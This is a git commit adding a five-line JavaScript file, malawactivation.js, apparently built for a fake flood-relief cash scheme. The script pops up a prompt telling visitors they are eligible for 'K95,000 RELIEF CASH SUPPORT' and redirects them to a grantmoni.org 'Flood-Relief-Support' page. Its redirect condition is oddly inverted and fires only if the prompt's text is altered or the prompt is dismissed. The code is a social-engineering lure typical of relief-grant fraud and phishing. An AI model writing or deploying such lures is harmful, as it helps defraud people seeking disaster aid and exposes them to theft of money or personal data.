4c588b540d8d7b7052b19f742ea9297e53c6ebe7
grntmoni <casket-90-crystal@icloud.com>
2026-01-22 13:01:12 +0100

    Create malawactivation.js

---
+++ malawactivation.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Congratulations, you are eligible to receive the K95,000 RELIEF CASH SUPPORT, press OK to receive your K95,000 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://grantmoni.org/Flood-Relief-Support.html';
+}
